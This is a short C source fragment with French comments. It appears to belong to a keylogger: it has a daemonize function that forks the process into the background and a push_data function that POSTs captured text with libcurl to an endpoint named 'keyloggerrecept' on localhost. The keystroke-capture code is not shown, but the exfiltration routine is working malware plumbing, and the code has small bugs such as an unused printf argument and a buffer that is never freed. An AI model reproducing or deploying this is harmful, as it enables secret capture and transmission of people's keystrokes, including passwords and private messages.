int daemonize( ){

  pid_t pid; //identifiant de processus
  pid = fork();

  if( pid < 0) {
    printf("exit \n");
    exit( EXIT_FAILURE );
  }
  printf("dans la fonction => %d\n", pid);
  return (int)pid;
}


int push_data(char *msg )
{
  printf("curl\n  ", msg);
  CURL *curl;
  CURLcode res;
  curl_global_init(CURL_GLOBAL_ALL);
  size_t fullSize;

  curl = curl_easy_init();
  fullSize = strlen( "data=" ) + 1 +  strlen( msg ) + 1;
  char *data     = (char *) malloc( fullSize );
  strcpy(data, "data=");
  strcat(data, msg);

  printf("%s\n", data);
  if(curl) {
    curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/keyloggerrecept/");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    res = curl_easy_perform(curl);
    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));
    curl_easy_cleanup(curl);
  }
  curl_global_cleanup();
  return 0;
}
